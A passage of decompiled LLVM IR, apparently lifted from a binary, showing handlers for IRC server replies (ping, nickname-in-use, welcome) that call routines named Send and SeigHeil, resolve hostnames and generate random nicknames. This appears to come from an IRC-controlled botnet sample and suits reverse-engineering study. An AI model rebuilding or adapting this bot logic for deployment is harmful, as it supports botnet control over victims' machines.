dec_label_pc_10011c60:                            ; preds = %dec_label_pc_10011bf4, %dec_label_pc_10011b74, %dec_label_pc_10011b68, %dec_label_pc_10011828, %dec_label_pc_10011728, %dec_label_pc_10011628, %dec_label_pc_10011528, %dec_label_pc_10011428, %dec_label_pc_10011328, %dec_label_pc_10011228, %dec_label_pc_10011128, %dec_label_pc_10011028, %dec_label_pc_10010f28, %dec_label_pc_10010e4c, %dec_label_pc_10010db0, %dec_label_pc_10010d84, %entry
  %v2_10011c60 = load i32, i32* %stack_var_-2208, align 4
  %v1_10011c6c = add i32 %v2_10011c60, -12
  %v2_10011c6c = inttoptr i32 %v1_10011c6c to i32*
  %v3_10011c6c = load i32, i32* %v2_10011c6c, align 4
  store i32 %v3_10011c6c, i32* %r29.global-to-local, align 4
  %v0_10011c78 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011c78

; uselistorder directives
  uselistorder i32 %storemerge1318, { 1, 0 }
  uselistorder i32 %v2_10011c54, { 1, 0, 2 }
  uselistorder i32 %v2_10011b4c, { 1, 0 }
  uselistorder i32 %storemerge14.lcssa, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10011a48, { 0, 3, 4, 1, 5, 2 }
  uselistorder i32 %stack_var_-2160.031, { 3, 0, 2, 1 }
  uselistorder i32 %v2_10011a20, { 2, 1, 0 }
  uselistorder i32 %stack_var_-2156.2, { 3, 1, 2, 0 }
  uselistorder i32 %v1_100119cc, { 1, 0 }
  uselistorder i32 %stack_var_-2156.138, { 1, 0 }
  uselistorder i32 %storemerge1239, { 1, 0 }
  uselistorder i32 %v4_100119d8, { 1, 3, 0, 2 }
  uselistorder i8* %stack_var_-2152.044, { 0, 1, 5, 4, 2, 3 }
  uselistorder i32 %storemerge1145, { 1, 0 }
  uselistorder i32 %v0_1001190c, { 1, 0, 2 }
  uselistorder i32 %v5_10011884, { 1, 0, 2 }
  uselistorder i32 %v2_1001183c, { 1, 3, 2, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 %v5_10011784, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_1001173c, { 1, 3, 2, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 %v5_10011684, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_1001163c, { 1, 3, 2, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 %v5_10011584, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_1001153c, { 1, 3, 2, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 %v5_10011484, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_1001143c, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v5_10011384, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_1001133c, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v5_10011284, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_1001123c, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v5_10011184, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_1001113c, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v5_10011084, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_1001103c, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v5_10010f84, { 3, 2, 6, 5, 4, 0, 1 }
  uselistorder i32 %v2_10010f3c, { 0, 3, 2, 4, 6, 5, 1, 7, 8 }
  uselistorder i32 %v2_10010e58, { 1, 0, 2 }
  uselistorder i32 %v1_10010df4, { 3, 0, 1, 4, 2, 5 }
  uselistorder i32 %v2_10010dd0, { 1, 0, 2 }
  uselistorder i32 %v2_10010d08, { 1, 0, 2 }
  uselistorder i32* %stack_var_-2200, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 167, 26, 27, 28, 29, 30, 31, 32, 1, 33, 4, 34, 35, 36, 40, 41, 37, 38, 39, 7, 6, 42, 43, 44, 45, 46, 47, 48, 52, 53, 49, 50, 51, 9, 8, 54, 55, 56, 57, 58, 59, 60, 64, 65, 61, 62, 63, 3, 2, 66, 67, 68, 69, 70, 71, 72, 76, 77, 73, 74, 75, 11, 10, 78, 79, 80, 81, 82, 83, 84, 88, 89, 85, 86, 87, 13, 12, 90, 91, 92, 93, 94, 95, 96, 100, 101, 97, 98, 99, 15, 14, 102, 103, 104, 105, 106, 107, 108, 112, 113, 109, 110, 111, 17, 16, 114, 115, 116, 117, 118, 119, 120, 124, 125, 121, 122, 123, 19, 18, 126, 127, 128, 129, 130, 131, 132, 136, 137, 133, 134, 135, 21, 20, 138, 139, 140, 141, 142, 143, 144, 148, 149, 145, 146, 147, 23, 22, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 24, 164, 165, 5, 166, 25, 168, 169, 0 }
  uselistorder i32* %r29.global-to-local, { 10, 11, 12, 0, 1, 13, 14, 2, 3, 15, 16, 8, 9, 17, 18, 4, 5, 19, 20, 6, 7 }
  uselistorder i32 268507372, { 1, 0 }
  uselistorder i32 268507116, { 1, 0 }
  uselistorder i32 268506860, { 1, 0 }
  uselistorder i32 268506604, { 1, 0 }
  uselistorder i32 268506348, { 1, 0 }
  uselistorder i32 268506092, { 1, 0 }
  uselistorder i32 268505836, { 1, 0 }
  uselistorder i32 268505580, { 1, 0 }
  uselistorder i32 268505324, { 1, 0 }
  uselistorder i32 (i32)* @pclose, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_1002d494.877 to i32), { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @feof, { 19, 9, 18, 8, 17, 7, 16, 6, 15, 5, 14, 4, 13, 3, 12, 2, 11, 1, 10, 0 }
  uselistorder i32 268505068, { 1, 0 }
  uselistorder [2 x i8]* @global_var_1002a6e0.110, { 1, 0 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 2, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0, 5, 4, 3, 1 }
  uselistorder i8* @global_var_10045150.22, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 4, 3, 0, 1, 5, 2 }
  uselistorder i32 %arg2, { 4, 6, 5, 7, 9, 8, 10, 12, 11, 13, 15, 14, 16, 18, 17, 19, 21, 20, 22, 24, 23, 25, 27, 26, 28, 30, 29, 31, 33, 32, 3, 0, 1, 34, 2, 36, 35 }
  uselistorder i32 %arg1, { 2, 4, 3, 6, 5, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15, 18, 17, 20, 19, 22, 21, 24, 23, 1, 0, 25 }
  uselistorder label %dec_label_pc_10011bf4, { 1, 0 }
  uselistorder label %dec_label_pc_10011ab0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011a90, { 1, 0 }
  uselistorder label %dec_label_pc_10011a44, { 1, 0 }
  uselistorder label %dec_label_pc_10011a0c, { 1, 0 }
  uselistorder label %dec_label_pc_100119c8, { 1, 0 }
  uselistorder label %dec_label_pc_1001199c, { 1, 0 }
  uselistorder label %dec_label_pc_100119d4.preheader, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10011924, { 1, 0 }
  uselistorder label %dec_label_pc_10011908, { 1, 0 }
  uselistorder label %dec_label_pc_10011894, { 1, 0 }
  uselistorder label %dec_label_pc_10011808, { 1, 0 }
  uselistorder label %dec_label_pc_10011794, { 1, 0 }
  uselistorder label %dec_label_pc_10011708, { 1, 0 }
  uselistorder label %dec_label_pc_10011694, { 1, 0 }
  uselistorder label %dec_label_pc_10011608, { 1, 0 }
  uselistorder label %dec_label_pc_10011594, { 1, 0 }
  uselistorder label %dec_label_pc_10011508, { 1, 0 }
  uselistorder label %dec_label_pc_10011494, { 1, 0 }
  uselistorder label %dec_label_pc_10011408, { 1, 0 }
  uselistorder label %dec_label_pc_10011394, { 1, 0 }
  uselistorder label %dec_label_pc_10011308, { 1, 0 }
  uselistorder label %dec_label_pc_10011294, { 1, 0 }
  uselistorder label %dec_label_pc_10011208, { 1, 0 }
  uselistorder label %dec_label_pc_10011194, { 1, 0 }
  uselistorder label %dec_label_pc_10011108, { 1, 0 }
  uselistorder label %dec_label_pc_10011094, { 1, 0 }
  uselistorder label %dec_label_pc_10011008, { 1, 0 }
  uselistorder label %dec_label_pc_10010f94, { 1, 0 }
  uselistorder label %dec_label_pc_10010f08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010e4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10010d84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010d64, { 1, 0 }
  uselistorder label %dec_label_pc_10010cfc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010cdc, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_10011ca0 = load i32, i32* @global_var_10045178.64, align 4
  %v6_10011cb8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1002df98.919 to i32), i32 %v3_10011ca0, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_10011cc0 = load i32, i32* @global_var_100451a4.544, align 4
  %v3_10011cc8 = load i32, i32* @global_var_1004519c.920, align 4
  %v6_10011ce4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1002dfa8.921 to i32), i32 %v3_10011cc0, i32 %v3_10011cc8)
  %v3_10011cec = load i32, i32* @global_var_10045178.64, align 4
  %v6_10011d04 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1002dfb8.922 to i32), i32 %v3_10011cec, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_10011d0c = load i32, i32* @global_var_10045148.571, align 4
  %v3_10011d10 = icmp eq i32 %v3_10011d0c, 0
  br i1 %v3_10011d10, label %dec_label_pc_10011d18, label %dec_label_pc_10011d20

dec_label_pc_10011d18:                            ; preds = %entry
  store i32 268508448, i32* @lr, align 4
  %v2_10011d1c = call i32 @SeigHeil(i32 %arg1, i32 268697600)
  br label %dec_label_pc_10011d20

dec_label_pc_10011d20:                            ; preds = %entry, %dec_label_pc_10011d18
  %v0_10011d34 = phi i32 [ %v6_10011d04, %entry ], [ %v2_10011d1c, %dec_label_pc_10011d18 ]
  ret i32 %v0_10011d34

; uselistorder directives
  uselistorder i32 (i32, i32)* @SeigHeil, { 1, 0 }
  uselistorder label %dec_label_pc_10011d20, { 1, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v6_10011d6c = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1002dfc0.923 to i32), i32 %arg3, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  ret i32 %v6_10011d6c
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-80 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10011d88 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10011d88, i32* %stack_var_-80, align 4
  br label %dec_label_pc_10011de0.preheader

dec_label_pc_10011dc8:                            ; preds = %dec_label_pc_10011df8
  %v4_10011df8 = ptrtoint i8* %stack_var_-68.056 to i32
  %v1_10011dcc = add i32 %v4_10011df8, 1
  %v5_10011dd0 = inttoptr i32 %v1_10011dcc to i8*
  %v1_10011dd8 = add i32 %stack_var_-60.055, 1
  store i32 %v1_10011dd8, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011de8 = call i32 @__GI_strlen()
  %v0_10011df0 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011df0 = icmp ult i32 %v0_10011df0, %v0_10011de8
  br i1 %v2_10011df0, label %dec_label_pc_10011df8, label %dec_label_pc_10011e0c

dec_label_pc_10011df8:                            ; preds = %dec_label_pc_10011de0.preheader, %dec_label_pc_10011dc8
  %stack_var_-68.056 = phi i8* [ %v5_10011dd0, %dec_label_pc_10011dc8 ], [ %stack_var_-68.162, %dec_label_pc_10011de0.preheader ]
  %stack_var_-60.055 = phi i32 [ %v1_10011dd8, %dec_label_pc_10011dc8 ], [ %stack_var_-60.161, %dec_label_pc_10011de0.preheader ]
  %v2_10011dfc = load i8, i8* %stack_var_-68.056, align 1
  %v3_10011e04 = icmp eq i8 %v2_10011dfc, 32
  br i1 %v3_10011e04, label %dec_label_pc_10011e0c, label %dec_label_pc_10011dc8

dec_label_pc_10011e0c:                            ; preds = %dec_label_pc_10011dc8, %dec_label_pc_10011df8, %dec_label_pc_10011de0.preheader
  %stack_var_-60.0.lcssa = phi i32 [ %stack_var_-60.161, %dec_label_pc_10011de0.preheader ], [ %v1_10011dd8, %dec_label_pc_10011dc8 ], [ %stack_var_-60.055, %dec_label_pc_10011df8 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.162, %dec_label_pc_10011de0.preheader ], [ %v5_10011dd0, %dec_label_pc_10011dc8 ], [ %stack_var_-68.056, %dec_label_pc_10011df8 ]
  %v4_10011e0c = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_10011e10 = add i32 %v4_10011e0c, 1
  store i32 %stack_var_-60.0.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011e20 = call i32 @__GI_strlen()
  %v0_10011e28 = load i32, i32* %r29.global-to-local, align 4
  %v4_10011e28 = icmp eq i32 %v0_10011e28, %v0_10011e20
  br i1 %v4_10011e28, label %dec_label_pc_100120e8, label %dec_label_pc_10011e30

dec_label_pc_10011e30:                            ; preds = %dec_label_pc_10011e0c
  %v5_10011e14 = inttoptr i32 %v1_10011e10 to i8*
  %v1_10011e34 = add nuw nsw i32 %storemerge763, 1
  %tmp90 = icmp slt i32 %v1_10011e34, 5
  br i1 %tmp90, label %dec_label_pc_10011de0.preheader, label %dec_label_pc_10011e60.preheader

dec_label_pc_10011de0.preheader:                  ; preds = %entry, %dec_label_pc_10011e30
  %storemerge763 = phi i32 [ 0, %entry ], [ %v1_10011e34, %dec_label_pc_10011e30 ]
  %stack_var_-68.162 = phi i8* [ %arg3, %entry ], [ %v5_10011e14, %dec_label_pc_10011e30 ]
  %stack_var_-60.161 = phi i32 [ 0, %entry ], [ %stack_var_-60.0.lcssa, %dec_label_pc_10011e30 ]
  store i32 %stack_var_-60.161, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011de850 = call i32 @__GI_strlen()
  %v0_10011df051 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011df052 = icmp ult i32 %v0_10011df051, %v0_10011de850
  br i1 %v2_10011df052, label %dec_label_pc_10011df8, label %dec_label_pc_10011e0c

dec_label_pc_10011e60.preheader:                  ; preds = %dec_label_pc_10011e30
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10011e10, i32* @r3, align 4
  %v0_10011e6840 = call i32 @__GI_strlen()
  %v0_10011e7041 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011e7042 = icmp ult i32 %v0_10011e7041, %v0_10011e6840
  br i1 %v2_10011e7042, label %dec_label_pc_10011e78, label %dec_label_pc_10011e98

dec_label_pc_10011e54:                            ; preds = %dec_label_pc_10011e78
  %v1_10011e58 = add i32 %storemerge845, 1
  store i32 %v1_10011e58, i32* %r29.global-to-local, align 4
  store i32 %v1_10011e10, i32* @r3, align 4
  %v0_10011e68 = call i32 @__GI_strlen()
  %v0_10011e70 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011e70 = icmp ult i32 %v0_10011e70, %v0_10011e68
  br i1 %v2_10011e70, label %dec_label_pc_10011e78, label %dec_label_pc_10011e98

dec_label_pc_10011e78:                            ; preds = %dec_label_pc_10011e60.preheader, %dec_label_pc_10011e54
  %storemerge845 = phi i32 [ %v1_10011e58, %dec_label_pc_10011e54 ], [ 0, %dec_label_pc_10011e60.preheader ]
  %v2_10011e84 = add i32 %storemerge845, %v1_10011e10
  %v1_10011e88 = inttoptr i32 %v2_10011e84 to i8*
  %v2_10011e88 = load i8, i8* %v1_10011e88, align 1
  %v3_10011e90 = icmp eq i8 %v2_10011e88, 32
  br i1 %v3_10011e90, label %dec_label_pc_10011e98, label %dec_label_pc_10011e54

dec_label_pc_10011e98:                            ; preds = %dec_label_pc_10011e54, %dec_label_pc_10011e78, %dec_label_pc_10011e60.preheader
  %storemerge8.lcssa = phi i32 [ 0, %dec_label_pc_10011e60.preheader ], [ %v1_10011e58, %dec_label_pc_10011e54 ], [ %storemerge845, %dec_label_pc_10011e78 ]
  %v2_10011ea4 = add i32 %storemerge8.lcssa, %v1_10011e10
  %v3_10011eac = inttoptr i32 %v2_10011ea4 to i8*
  store i8 0, i8* %v3_10011eac, align 1
  %v3_10011eb4 = load i32, i32* @global_var_10045178.64, align 4
  store i32 %v1_10011e10, i32* @r3, align 4
  store i32 %v3_10011eb4, i32* @r4, align 4
  %v3_10011ec0 = call i32 @__GI_strcasecmp(i32 %v1_10011e10, i32 %v3_10011eb4)
  %v3_10011ec8 = icmp eq i32 %v3_10011ec0, 0
  br i1 %v3_10011ec8, label %dec_label_pc_10011ed0, label %dec_label_pc_100120e8

dec_label_pc_10011ed0:                            ; preds = %dec_label_pc_10011e98
  %v3_10011ed4 = load i32, i32* @global_var_10045158.29, align 4
  %v3_10011ed8 = icmp eq i32 %v3_10011ed4, 0
  br i1 %v3_10011ed8, label %dec_label_pc_10011ee0, label %dec_label_pc_100120e8

dec_label_pc_10011ee0:                            ; preds = %dec_label_pc_10011ed0
  br label %dec_label_pc_10011f14.preheader

dec_label_pc_10011efc:                            ; preds = %dec_label_pc_10011f2c
  %v4_10011f2c = ptrtoint i8* %stack_var_-68.232 to i32
  %v1_10011f00 = add i32 %v4_10011f2c, 1
  %v5_10011f04 = inttoptr i32 %v1_10011f00 to i8*
  %v1_10011f0c = add i32 %stack_var_-60.231, 1
  store i32 %v1_10011f0c, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011f1c = call i32 @__GI_strlen()
  %v0_10011f24 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011f24 = icmp ult i32 %v0_10011f24, %v0_10011f1c
  br i1 %v2_10011f24, label %dec_label_pc_10011f2c, label %dec_label_pc_10011f40

dec_label_pc_10011f2c:                            ; preds = %dec_label_pc_10011f14.preheader, %dec_label_pc_10011efc
  %stack_var_-68.232 = phi i8* [ %v5_10011f04, %dec_label_pc_10011efc ], [ %stack_var_-68.338, %dec_label_pc_10011f14.preheader ]
  %stack_var_-60.231 = phi i32 [ %v1_10011f0c, %dec_label_pc_10011efc ], [ %stack_var_-60.337, %dec_label_pc_10011f14.preheader ]
  %v2_10011f30 = load i8, i8* %stack_var_-68.232, align 1
  %v3_10011f38 = icmp eq i8 %v2_10011f30, 32
  br i1 %v3_10011f38, label %dec_label_pc_10011f40, label %dec_label_pc_10011efc

dec_label_pc_10011f40:                            ; preds = %dec_label_pc_10011efc, %dec_label_pc_10011f2c, %dec_label_pc_10011f14.preheader
  %stack_var_-60.2.lcssa = phi i32 [ %stack_var_-60.337, %dec_label_pc_10011f14.preheader ], [ %v1_10011f0c, %dec_label_pc_10011efc ], [ %stack_var_-60.231, %dec_label_pc_10011f2c ]
  %stack_var_-68.2.lcssa = phi i8* [ %stack_var_-68.338, %dec_label_pc_10011f14.preheader ], [ %v5_10011f04, %dec_label_pc_10011efc ], [ %stack_var_-68.232, %dec_label_pc_10011f2c ]
  %v4_10011f40 = ptrtoint i8* %stack_var_-68.2.lcssa to i32
  %v1_10011f44 = add i32 %v4_10011f40, 1
  store i32 %stack_var_-60.2.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011f54 = call i32 @__GI_strlen()
  %v0_10011f5c = load i32, i32* %r29.global-to-local, align 4
  %v4_10011f5c = icmp eq i32 %v0_10011f5c, %v0_10011f54
  br i1 %v4_10011f5c, label %dec_label_pc_100120e8, label %dec_label_pc_10011f64

dec_label_pc_10011f64:                            ; preds = %dec_label_pc_10011f40
  %v5_10011f48 = inttoptr i32 %v1_10011f44 to i8*
  %v1_10011f68 = add nuw nsw i32 %storemerge939, 1
  %tmp91 = icmp slt i32 %v1_10011f68, 3
  br i1 %tmp91, label %dec_label_pc_10011f14.preheader, label %dec_label_pc_10011f94.preheader

dec_label_pc_10011f14.preheader:                  ; preds = %dec_label_pc_10011ee0, %dec_label_pc_10011f64
  %storemerge939 = phi i32 [ 0, %dec_label_pc_10011ee0 ], [ %v1_10011f68, %dec_label_pc_10011f64 ]
  %stack_var_-68.338 = phi i8* [ %arg3, %dec_label_pc_10011ee0 ], [ %v5_10011f48, %dec_label_pc_10011f64 ]
  %stack_var_-60.337 = phi i32 [ 0, %dec_label_pc_10011ee0 ], [ %stack_var_-60.2.lcssa, %dec_label_pc_10011f64 ]
  store i32 %stack_var_-60.337, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10011f1c26 = call i32 @__GI_strlen()
  %v0_10011f2427 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011f2428 = icmp ult i32 %v0_10011f2427, %v0_10011f1c26
  br i1 %v2_10011f2428, label %dec_label_pc_10011f2c, label %dec_label_pc_10011f40

dec_label_pc_10011f94.preheader:                  ; preds = %dec_label_pc_10011f64
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10011f44, i32* @r3, align 4
  %v0_10011f9c17 = call i32 @__GI_strlen()
  %v0_10011fa418 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011fa419 = icmp ult i32 %v0_10011fa418, %v0_10011f9c17
  br i1 %v2_10011fa419, label %dec_label_pc_10011fac, label %dec_label_pc_10011fcc

dec_label_pc_10011f88:                            ; preds = %dec_label_pc_10011fac
  %v1_10011f8c = add i32 %storemerge1022, 1
  store i32 %v1_10011f8c, i32* %r29.global-to-local, align 4
  store i32 %v1_10011f44, i32* @r3, align 4
  %v0_10011f9c = call i32 @__GI_strlen()
  %v0_10011fa4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011fa4 = icmp ult i32 %v0_10011fa4, %v0_10011f9c
  br i1 %v2_10011fa4, label %dec_label_pc_10011fac, label %dec_label_pc_10011fcc

dec_label_pc_10011fac:                            ; preds = %dec_label_pc_10011f94.preheader, %dec_label_pc_10011f88
  %storemerge1022 = phi i32 [ %v1_10011f8c, %dec_label_pc_10011f88 ], [ 0, %dec_label_pc_10011f94.preheader ]
  %v2_10011fb8 = add i32 %storemerge1022, %v1_10011f44
  %v1_10011fbc = inttoptr i32 %v2_10011fb8 to i8*
  %v2_10011fbc = load i8, i8* %v1_10011fbc, align 1
  %v3_10011fc4 = icmp eq i8 %v2_10011fbc, 32
  br i1 %v3_10011fc4, label %dec_label_pc_10011fcc, label %dec_label_pc_10011f88

dec_label_pc_10011fcc:                            ; preds = %dec_label_pc_10011f88, %dec_label_pc_10011fac, %dec_label_pc_10011f94.preheader
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_10011f94.preheader ], [ %v1_10011f8c, %dec_label_pc_10011f88 ], [ %storemerge1022, %dec_label_pc_10011fac ]
  %v2_10011fd8 = add i32 %storemerge10.lcssa, %v1_10011f44
  %v3_10011fe0 = inttoptr i32 %v2_10011fd8 to i8*
  store i8 0, i8* %v3_10011fe0, align 1
  store i32 268509164, i32* @lr, align 4
  %v2_10011fe8 = call i32 @inet_addr(i32 %v1_10011f44)
  %v5_10011ff0 = trunc i32 %v2_10011fe8 to i8
  store i8 %v5_10011ff0, i8* %stack_var_-56, align 1
  %v4_10011ffc = icmp eq i8 %v5_10011ff0, -1
  br i1 %v4_10011ffc, label %dec_label_pc_10012004, label %dec_label_pc_10012070

dec_label_pc_10012004:                            ; preds = %dec_label_pc_10011fcc
  store i32 268509196, i32* @lr, align 4
  %v2_10012008 = call i32 @__GI_gethostbyname(i32 %v1_10011f44)
  %v3_10012018 = icmp eq i32 %v2_10012008, 0
  br i1 %v3_10012018, label %dec_label_pc_10012020, label %dec_label_pc_10012044

dec_label_pc_10012020:                            ; preds = %dec_label_pc_10012004
  %v3_10012024 = load i32, i32* @global_var_100451a4.544, align 4
  %v6_1001203c = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1002dfcc.924 to i32), i32 %v3_10012024, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_100120e8

dec_label_pc_10012044:                            ; preds = %dec_label_pc_10012004
  %v2_10012044 = ptrtoint i8* %stack_var_-56 to i32
  %v1_1001204c = add i32 %v2_10012008, 16
  %v2_1001204c = inttoptr i32 %v1_1001204c to i32*
  %v3_1001204c = load i32, i32* %v2_1001204c, align 4
  %v1_10012050 = inttoptr i32 %v3_1001204c to i32*
  %v2_10012050 = load i32, i32* %v1_10012050, align 4
  %v1_10012058 = add i32 %v2_10012008, 12
  %v2_10012058 = inttoptr i32 %v1_10012058 to i32*
  %v3_10012058 = load i32, i32* %v2_10012058, align 4
  store i32 %v2_10012044, i32* @r3, align 4
  store i32 %v2_10012050, i32* @r4, align 4
  store i32 %v3_10012058, i32* @r5, align 4
  store i32 268509296, i32* @lr, align 4
  %v0_1001206c = call i32 @memcpy()
  %v2_10012080.pre = load i8, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10012070

dec_label_pc_10012070:                            ; preds = %dec_label_pc_10011fcc, %dec_label_pc_10012044
  %v0_1001210074 = phi i32 [ %v0_1001206c, %dec_label_pc_10012044 ], [ %v2_10011fe8, %dec_label_pc_10011fcc ]
  %v2_10012080 = phi i8 [ %v2_10012080.pre, %dec_label_pc_10012044 ], [ %v5_10011ff0, %dec_label_pc_10011fcc ]
  store i8 %v2_10012080, i8* bitcast (i8** @global_var_10045157.926 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_10045154.28 to i8*), align 4
  store i32 256, i32* @global_var_10045158.29, align 4
  br label %dec_label_pc_100120e8

dec_label_pc_100120e8:                            ; preds = %dec_label_pc_10011e0c, %dec_label_pc_10011f40, %dec_label_pc_10011ed0, %dec_label_pc_10011e98, %dec_label_pc_10012020, %dec_label_pc_10012070
  %v0_10012100 = phi i32 [ 0, %dec_label_pc_10011ed0 ], [ %v3_10011ec0, %dec_label_pc_10011e98 ], [ %v6_1001203c, %dec_label_pc_10012020 ], [ %v0_1001210074, %dec_label_pc_10012070 ], [ %v0_10011f54, %dec_label_pc_10011f40 ], [ %v0_10011e20, %dec_label_pc_10011e0c ]
  %v2_100120e8 = load i32, i32* %stack_var_-80, align 4
  %v1_100120f4 = add i32 %v2_100120e8, -12
  %v2_100120f4 = inttoptr i32 %v1_100120f4 to i32*
  %v3_100120f4 = load i32, i32* %v2_100120f4, align 4
  store i32 %v3_100120f4, i32* %r29.global-to-local, align 4
  ret i32 %v0_10012100

; uselistorder directives
  uselistorder i32 %stack_var_-60.337, { 2, 0, 1 }
  uselistorder i32 %v1_10011f68, { 1, 0 }
  uselistorder i32 %v1_10011f44, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %stack_var_-60.161, { 2, 0, 1 }
  uselistorder i32 %v1_10011e34, { 1, 0 }
  uselistorder i32 %v1_10011e10, { 3, 2, 0, 1, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 8, 9, 10, 0, 1, 2, 3, 11, 12, 13, 14, 15, 16, 6, 7, 4, 5, 17, 18, 19, 20 }
  uselistorder i8** @global_var_10045154.28, { 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_10045158.29, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100120e8, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10012070, { 1, 0 }
  uselistorder label %dec_label_pc_10011fcc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011fac, { 1, 0 }
  uselistorder label %dec_label_pc_10011f14.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10011f40, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011e98, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011e78, { 1, 0 }
  uselistorder label %dec_label_pc_10011de0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10011e0c, { 2, 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_10012128 = load i32, i32* @global_var_10045178.64, align 4
  store i32 %v3_10012128, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012134.929 to i32), i32* @lr, align 4
  %v0_10012130 = call i32 @free()
  store i32 268509504, i32* @lr, align 4
  %v2_1001213c = call i32 @realrand(i32 4, i32 8)
  store i32 268509516, i32* @lr, align 4
  %v1_10012148 = call i32 @randstring(i32 %v2_1001213c)
  store i32 %v1_10012148, i32* @global_var_10045178.64, align 4
